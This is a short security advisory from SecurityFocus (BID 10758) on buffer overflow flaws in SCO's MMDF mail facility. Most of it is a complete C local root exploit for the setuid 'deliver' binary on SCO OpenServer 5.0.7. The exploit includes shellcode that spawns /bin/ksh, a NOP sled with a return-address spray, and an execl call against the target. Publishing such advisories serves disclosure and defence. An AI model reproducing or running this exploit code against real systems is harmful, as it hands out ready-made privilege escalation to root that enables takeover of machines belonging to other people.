source: http://www.securityfocus.com/bid/10758/info

It has been reported that the SCO Multi-channel Memorandum Distribution Facility (MMDF) is affected by multiple vulnerabilities. These issues are due to a failure of the utility to properly validate buffer boundaries when copying user-supplied input.

These issues are known to be exploitable locally, however due to the nature of the application it is likely that remote exploitation is possible as well, although this is not confirmed.

An attacker might leverage these issues to execute arbitrary code in the context of the vulnerable utility; many of the affected utilities are setuid binaries by default. These issues might also be leveraged to cause the affected utility to crash, denying service to legitimate users.

/*
 *  MMDF deliver local root exploit for SCO OpenServer 5.0.7 x86
 *  Copyright 2004 Ramon de Carvalho Valle
 *
 */

char shellcode[]=           /*  36 bytes                          */
    "\x68\xff\xf8\xff\x3c"  /*  pushl   $0x3cfff8ff               */
    "\x6a\x65"              /*  pushl   $0x65                     */
    "\x89\xe6"              /*  movl    %esp,%esi                 */
    "\xf7\x56\x04"          /*  notl    0x04(%esi)                */
    "\xf6\x16"              /*  notb    (%esi)                    */
    "\x31\xc0"              /*  xorl    %eax,%eax                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x68""/ksh"            /*  pushl   $0x68736b2f               */
    "\x68""/bin"            /*  pushl   $0x6e69622f               */
    "\x89\xe3"              /*  movl    %esp,%ebx                 */
    "\x50"                  /*  pushl   %eax                      */
    "\x50"                  /*  pushl   %eax                      */
    "\x53"                  /*  pushl   %ebx                      */
    "\xb0\x3b"              /*  movb    $0x3b,%al                 */
    "\xff\xd6"              /*  call    *%esi                     */
;

main(int argc,char **argv) {
    char buffer[16384],address[4],*p;
    int i;

    printf("MMDF deliver local root exploit for SCO OpenServer 5.0.7 x86\n");
    printf("Copyright 2004 Ramon de Carvalho Valle\n\n");

    *((unsigned long *)address)=(unsigned long)buffer-256+5120+4097;

    sprintf(buffer,"-c");
    p=buffer+2;
    for(i=0;i<5120;i++) *p++=address[i%4];
    for(i=0;i<8192;i++) *p++=0x90;
    for(i=0;i<strlen(shellcode);i++) *p++=shellcode[i];
    *p=0;

    execl("/usr/mmdf/bin/deliver","deliver",buffer,0);
}